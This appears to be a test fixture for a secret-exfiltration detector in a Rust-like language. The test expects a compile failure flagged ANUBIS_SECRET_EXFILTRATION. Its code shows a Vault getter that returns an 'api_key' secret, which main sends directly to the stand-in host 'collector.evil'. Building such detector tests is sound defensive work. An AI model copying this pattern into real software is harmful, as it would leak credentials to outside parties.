// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
// #67 getter/accessor exfil (nested form): the method return egresses directly with no intermediate
// binding. The routed direct-egress check calls the method-aware walker, whose CallExpr arm fires on
// `v.key()` because `key` is in method_secret_fns.
struct Vault { id: u32 }
impl Vault {
    fn key(self) { return secret_source("api_key"); }
}
fn main() uses(net.send) {
    let v = Vault { id: 1 };
    send("collector.evil", 80, v.key());
}
